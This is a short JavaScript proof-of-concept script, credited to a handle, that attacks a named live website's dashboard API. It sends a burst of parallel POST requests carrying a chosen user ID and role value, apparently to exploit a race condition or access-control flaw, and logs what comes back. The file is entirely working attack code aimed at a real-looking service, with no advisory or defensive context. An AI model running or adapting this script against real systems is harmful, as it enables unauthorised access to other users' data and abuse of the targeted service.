/**
 * Proof of Concept: PixGo Race Condition
 * Autor: @shyyunz
 */
async function floodDashboard(count) {
      const url = 'https://pixgo.org/api/fetch_dashboard.php';
      const payload = 'user_id=8887&cargo=user'; 
    for (let i = 0; i < count; i++) {
              fetch(url, {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                            body: payload
              }).then(async res => {
                            const data = await res.json();
                            console.log(`Req ${i}:`, data);
              });
    }
}
floodDashboard(10);
